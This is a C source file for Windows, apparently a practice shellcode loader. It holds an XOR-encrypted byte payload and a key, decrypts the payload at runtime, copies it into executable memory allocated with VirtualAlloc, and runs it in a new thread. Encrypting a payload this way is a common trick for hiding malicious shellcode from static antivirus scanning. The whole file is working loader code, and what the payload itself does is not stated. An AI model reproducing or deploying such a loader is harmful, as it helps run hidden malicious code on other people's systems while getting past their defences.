#include <Windows.h>
#include <stdio.h>

unsigned char Data_RawData[] =
"\x56\xe6\x2c\xe7\x5a\x46\x6f\x03\xaa\xae\xee\x52\xeb\xfe\xfd\x52\xfc\xe6\x9e\xd1\xcf\xe6\x24\x51\xca\xe6\x24\x51\xb2\xe6\x24\x51\x8a\xe6\x24\x71\xfa\xe6\xa0\xb4\xe0\xe4\xe2\x32\x63\xe6\x9e\xc3\x06\x92\xce\x7f\xa8\x82\x8f\x42\x6b\x67\xa2\x42\xab\x6f\x4d\xee\xf8\xef\xfe\x4b\x21\xfc\x8f\x88\xe8\x92\xe7\x02\x7a\x25\x2f\x8b\xaa\xae\xaf\x4b\x2f\x6e\xdb\x64\xe2\xaf\x7f\x53\x21\xe6\xb7\x47\x21\xee\x8f\x4a\xab\x7e\x4c\x55\xe2\x51\x66\x42\x21\x9a\x27\x4b\xab\x78\xe2\x32\x63\xe6\x9e\xc3\x06\xef\x6e\xca\xa7\xef\xae\xc2\x92\x4e\xda\xf2\xe6\xad\xe3\x27\xa2\xeb\x96\xd2\xdf\x76\xf7\x47\x21\xee\x8b\x4a\xab\x7e\xc9\x42\x21\xa2\xe7\x47\x21\xee\xb3\x4a\xab\x7e\xee\x88\xae\x26\xe7\x02\x7a\xef\xf7\x42\xf2\xf0\xf6\x59\xeb\xf6\xee\x5a\xeb\xf4\xe7\x80\x46\x8e\xee\x51\x55\x4e\xf7\x42\xf3\xf4\xe7\x88\xb8\x47\xf8\xfc\x55\x51\xf2\x4b\x10\xaf\xaf\x03\xaa\xae\xaf\x03\xaa\xe6\x22\x8e\xab\xaf\xaf\x03\xeb\x14\x9e\x88\xc5\x29\x50\xd6\x11\x5e\x1a\xa1\xfc\xef\x15\xa5\x3f\x13\x32\xfc\x7f\xe6\x2c\xc7\x82\x92\xa9\x7f\xa0\x2e\x54\xe3\xdf\xab\x14\x44\xb9\xdc\xc0\x69\xaa\xf7\xee\x8a\x70\x51\x7a\x60\xcb\xc2\xcc\x2d\xcf\xd6\xca\x03\xaa";

unsigned char bKey[] = {0xAA, 0xAe, 0xAf, 0x03};

VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
	for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
		if (j >= sKeySize) {
			j = 0;
		}
		pShellcode[i] = pShellcode[i] ^ bKey[j];
	}
}

int main() {

	printf("[i] Data_RawData var : 0x%p \n", Data_RawData);
	//printf("[#] Press <Enter> To Quit ...\n");
	//printf("encrptyed payload \n");
	//XorByInputKey(Data_RawData, sizeof(Data_RawData), bKey , sizeof(bKey));
	// printf("Shellcode (Hex String):\n\"");
	//for (size_t i = 0; i < sizeof(Data_RawData); i++) {
	//	// Print with the leading \x prefix for each byte
	//	printf("\\x%02x", Data_RawData[i]);
	//}
	//printf("\"\n"); 

	 printf("press enter to excute the payload \n");
	getchar();

	// 1] Allocating Virtual Memory where your shellcode will live
	LPVOID execmemory = VirtualAlloc(NULL, sizeof(Data_RawData), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	// std::cout << "The Allocated Memory Address: 0x" << std::hex << (ULONG_PTR)execmemory << std::dec << std::endl;
	printf("The Allocated Memory Address: 0x%p \n", execmemory);
	getchar();

	printf("dencrptyed payload \n");
	XorByInputKey(Data_RawData, sizeof(Data_RawData), bKey, sizeof(bKey));

	// 2] Copying the Shellcode to the allocated memory to the address which we have reserve 
	memcpy(execmemory, Data_RawData, sizeof(Data_RawData));
	printf("the shell code is copped to the momory region\n");
	getchar();

	// 3] Starting a Thread to execute the memory region
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execmemory, NULL, 0, NULL );
	printf("Thread is created \n");

	// 4] Waiting for the Thread to exit
	WaitForSingleObject(hThread, INFINITE);


	// cleaning
	CloseHandle(hThread);
	VirtualFree(execmemory, 0, MEM_RELEASE);

	

	return 0;
}
